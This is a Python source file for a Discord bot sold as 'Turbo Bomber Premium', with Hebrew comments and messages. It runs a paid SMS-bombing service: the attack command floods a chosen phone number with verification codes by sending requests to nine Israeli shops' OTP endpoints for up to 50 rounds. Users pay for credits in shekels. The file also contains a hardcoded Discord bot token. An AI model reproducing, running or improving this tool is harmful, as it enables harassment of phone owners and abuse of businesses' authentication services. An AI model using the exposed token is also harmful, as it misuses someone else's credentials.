import discord
from discord.ext import commands
import requests
import time
import uuid
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask Uptime ---
app = Flask('')
@app.route('/')
def home(): return "<h1>💎 Turbo Bomber Premium Edition Online</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות בוט ---
TOKEN = 'MTQ5MzEzMTA0MDM1NTUxNjUyOA.G3v7ZJ.SMKVMJvN3ivXnxFYViTMzDWTj2Cyfm7NPwVprc'
ADMIN_ID = 7265913946  # ה-ID שלך בדיסקורד
intents = discord.Intents.default()
intents.message_content = True 
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# מאגר נתונים זמני (בשרת חי מומלץ להשתמש ב-JSON או DB)
user_db = {}

def get_user_data(user_id):
    if user_id not in user_db:
        user_db[user_id] = {'credits': 10} # 10 קרדיטים מתנה למצטרפים חדשים
    return user_db[user_id]

# --- פונקציית התקפה (9 אתרים) ---
def run_attack(target):
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"phone": target}, "type": "form"},
        {"n": "Atmos 6", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json"},
        {"n": "Atmos 18", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json"},
        {"n": "Atmos 2", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"}
    ]
    success = 0
    for site in apis:
        try:
            h = {"User-Agent": "Mozilla/5.0"}
            if site["type"] == "json":
                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.6)
            else:
                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.6)
            if res.status_code in [200, 201, 204]: success += 1
        except: pass
    return success

# --- פקודות ---

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!help | Tzur Services"))
    print(f'💎 Premium Bomber is Live as {bot.user}')

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="💎 Turbo Bomber Premium", description="ברוכים הבאים למערכת ההפצצה המתקדמת של צור", color=0x00ffff)
    embed.add_field(name="🚀 פקודות תקיפה", value="`!attack [Phone] [Rounds]` - מינימום דיליי", inline=False)
    embed.add_field(name="👤 פקודות משתמש", value="`!me` - בדיקת יתרת קרדיטים\n`!buy` - מידע על רכישה", inline=True)
    embed.add_field(name="👑 פקודות ניהול", value="`!add [User_ID] [Amount]` - להוספת קרדיטים", inline=True)
    embed.set_footer(text="Developed by Tzur | v3.0")
    await ctx.send(embed=embed)

@bot.command()
async def me(ctx):
    data = get_user_data(ctx.author.id)
    embed = discord.Embed(title="👤 פרופיל משתמש", color=0x2ecc71)
    embed.add_field(name="שם", value=ctx.author.name)
    embed.add_field(name="יתרת קרדיטים", value=f"💎 {data['credits']}")
    await ctx.send(embed=embed)

@bot.command()
async def buy(ctx):
    embed = discord.Embed(title="🛒 רכישת קרדיטים", description="רוצה להפציץ ללא הגבלה? צור קשר עם המנהל!", color=0xf1c40f)
    embed.add_field(name="💳 מחירים", value="100 קרדיטים - 10₪\n500 קרדיטים - 40₪\n**ללא הגבלה שבועי - 70₪**", inline=False)
    embed.add_field(name="📞 ליצירת קשר", value="<@7265913946> או בפרטי", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def add(ctx, user_id: int, amount: int):
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("❌ אין לך הרשאה להשתמש בפקודה זו.")
    data = get_user_data(user_id)
    data['credits'] += amount
    await ctx.send(f"✅ נוספו {amount} קרדיטים למשתמש <@{user_id}>. יתרה חדשה: {data['credits']}")

@bot.command()
async def attack(ctx, phone: str, rounds: int):
    user = get_user_data(ctx.author.id)
    
    if user['credits'] < rounds:
        return await ctx.send(f"❌ אין לך מספיק קרדיטים! חסרים לך {rounds - user['credits']} קרדיטים. שלח `!buy` לפרטים.")

    if rounds > 50:
        return await ctx.send("❌ מקסימום 50 סבבים למתקפה אחת (כדי למנוע חסימות).")

    user['credits'] -= rounds
    embed = discord.Embed(title="🔥 מתקפת טורבו יוצאת לדרך!", color=0xff0000)
    embed.add_field(name="מטרה", value=phone, inline=True)
    embed.add_field(name="סבבים", value=rounds, inline=True)
    embed.set_thumbnail(url="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJmZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6ZzRyeGZ6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/H7kbTCat3fH9K/giphy.gif")
    status_msg = await ctx.send(embed=embed)

    for r in range(rounds):
        sc = run_attack(phone)
        update = discord.Embed(title="🚀 Bombs Away...", color=0xe74c3c)
        update.add_field(name="התקדמות", value=f"סבב {r+1} מתוך {rounds}")
        update.add_field(name="סטטוס", value=f"נשלחו הודעות מ-{sc} אתרים")
        await status_msg.edit(embed=update)
        time.sleep(0.01)

    final = discord.Embed(title="🏁 המשימה הושלמה!", description=f"המספר {phone} הופצץ בהצלחה.", color=0x9b59b6)
    final.add_field(name="יתרת קרדיטים חדשה", value=f"💎 {user['credits']}")
    await ctx.send(embed=final)

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
